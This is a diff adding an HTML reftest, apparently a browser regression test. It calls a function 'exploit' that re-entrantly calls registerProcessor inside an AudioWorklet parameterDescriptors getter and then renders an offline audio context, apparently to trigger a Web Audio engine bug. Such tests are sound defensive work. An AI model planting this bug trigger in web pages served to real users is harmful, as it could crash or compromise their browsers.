@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html class="reftest-wait">
+<body>
+<script>
+async function exploit() {
+  const ctx = new OfflineAudioContext(1, 128, 44100);
+
+  const workletCode = `
+    let guard = false;
+    class P extends AudioWorkletProcessor {
+      static get parameterDescriptors() {
+        if (!guard) {
+          guard = true;
+          registerProcessor('p', P);
+        }
+        return [];
+      }
+      process() { return false; }
+    }
+    registerProcessor('p', P);
+  `;
+
+  const blob = new Blob([workletCode], {type: 'application/javascript'});
+  const url = URL.createObjectURL(blob);
+  await ctx.audioWorklet.addModule(url);
+  URL.revokeObjectURL(url);
+
+  const node = new AudioWorkletNode(ctx, 'p');
+  node.connect(ctx.destination);
+
+  const buffer = await ctx.startRendering();
+
+  await new Promise(r => setTimeout(r, 500));
+  document.documentElement.classList.remove('reftest-wait');
+}
+
+exploit().catch(e => {
+  document.documentElement.classList.remove('reftest-wait');
+});
+</script>
+</body>
+</html>
